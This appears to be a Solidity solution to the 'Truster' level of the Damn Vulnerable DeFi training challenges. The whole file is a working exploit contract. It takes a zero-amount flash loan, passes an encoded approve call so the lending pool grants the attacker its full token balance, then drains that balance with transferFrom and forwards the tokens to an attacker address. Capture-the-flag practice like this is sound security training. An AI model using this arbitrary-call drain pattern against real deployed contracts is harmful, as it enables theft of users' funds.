pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "contracts/naive-receiver/NaiveReceiverLenderPool.sol";
import "contracts/truster/TrusterLenderPool.sol";

contract TrusterAttacker {
    using Address for address payable;
    IERC20 public immutable damnValuableToken;

    constructor(address tokenAddress) {
        require(tokenAddress != address(0), "Token address cannot be zero");
        damnValuableToken = IERC20(tokenAddress);
    }

    function exploit(TrusterLenderPool target, address atker) external {
        target.flashLoan(
            0,
            address(this),
            address(damnValuableToken),
            abi.encodeWithSignature("approve(address,uint256)",address(this),damnValuableToken.balanceOf(address(target))
            )
        );
        damnValuableToken.transferFrom(address(target), address(this), damnValuableToken.balanceOf(address(target)));
        damnValuableToken.transfer(atker, damnValuableToken.balanceOf(address(this)));
    }

}
